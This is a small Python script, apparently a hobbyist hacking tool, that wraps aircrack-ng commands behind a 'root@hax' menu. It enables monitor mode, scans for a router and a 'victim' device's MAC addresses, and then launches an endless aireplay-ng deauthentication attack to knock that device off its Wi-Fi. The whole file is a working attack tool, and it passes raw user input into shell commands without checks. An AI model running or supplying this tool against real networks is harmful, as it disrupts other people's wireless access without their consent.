import os
import time

def Menu():
    os.system('clear')
    print("""
1. Monitor Mode On
2. Monitor Mode Off
3. Deauth Device
4. Exit 
""")
loop = True
while loop:
    Menu()
    what = input("root@hax > ")
    if what == "1":
        print('')
        print('Enter Your Wifi Interface: ')
        i = input()
        os.system('sudo airmon-ng start ' + i)
        os.system('clear')
        print('')
        print('Monitor Mode Turned On!')
        print('')
        time.sleep(3)
    elif what == "2":
        print('')
        print('Enter Your Wifi Interface: ')
        f = input()
        os.system('sudo airmon-ng stop ' + f)
        os.system('clear')
        print('')
        print('Monitor Mode Turned Off!')
        print('')
        time.sleep(3)
    elif what == "3":
        os.system("clear")
        print('Enter Your Wifi Interface: ')
        c = input()
        os.system('xterm -geometry 85x20+100+350 -T "Copy Router MAC Address!" -hold -e airodump-ng '+c+'')
        print('Enter Your Router MAC: ')
        b = input()
        os.system('xterm -geometry 85x20+100+350 -T "Copy Router CHANNEL Address!" -hold -e airodump-ng '+c+'')
        print('Enter Your Router CHANNEL: ')
        a = input()
        os.system('xterm -geometry 85x20+100+350 -T "Copy Victim MAC Address!" -hold -e airodump-ng '+c+' --bssid '+b+' --channel '+a+'')
        print('Enter Your Victim MAC: ')
        r = input()
        print('')
        print('Deauth Started!')
        print('')
        os.system('xterm -geometry 85x20+100+350 -T "Attack In Progress!" -hold -e aireplay-ng --deauth 0 -c '+r+' -a '+b+' '+c+'')
    elif what == "4":
        os.system("clear")
        print('Goodbye!')
        break
